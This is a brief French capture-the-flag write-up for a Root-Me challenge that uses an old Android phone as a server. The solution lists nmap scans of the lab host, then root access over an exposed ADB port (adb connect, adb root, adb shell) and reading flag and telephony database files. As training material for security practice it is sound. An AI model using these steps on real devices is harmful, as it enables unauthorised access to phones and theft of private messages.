# End Droid

## 15 Points 
### La fin d’Android a sonné !

## Énoncé
Un petit groupe d’étudiants a voulu changer les vieilles habitudes et choisir un vieux téléphone Android comme serveur afin d’héberger leur application de gestion de projets.

Parviendrez-vous à récupérer les communications secrètes qu’il contient ?

## Solution

nmap -p- -sV ctf09.root-me.org
nmap -p 22000, 8080, 5555 -A -sV ctf09.root-me.org

adb connect ctf09.root-me.org
adb root
adb shell

cd data/root

cat flag.txt

cd /data/user/0/com.android.providers.telephony/databases/cache

afficher le seul fichier à l'intérieur, c'est celui ou se trouve le flag.

